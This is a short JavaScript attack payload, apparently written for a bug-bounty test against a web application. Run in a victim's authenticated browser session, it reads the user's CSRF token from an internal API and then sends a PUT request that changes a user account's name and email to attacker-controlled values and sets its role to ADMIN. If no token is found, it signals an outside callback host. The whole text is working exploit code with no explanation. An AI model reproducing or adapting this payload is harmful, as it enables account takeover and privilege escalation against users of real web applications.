fetch('/web/internal/v1/users/current', {
    credentials: 'include'
}).then(r => r.text()).then(t => {
    let d = {};
    try {
        d = JSON.parse(t)
    } catch (e) {}
    let c = d.csrfToken || d.token || d.data?.csrfToken;
    if (!c) return fetch('//oastify.com/log?e=1');
    fetch('/web/api2/v3/users/yD6g4rpcvcbp9JCazqrxk1', {
        method: 'PUT',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': c
        },
        body: '{"firstName":"evil","lastName":"cathack","email":"aydilfhr+evil@intigriti.me","userName":"aydilfhr+evil","role":"ADMIN","timezone":"Europe/London","active":true,"note":""}'
    })
})
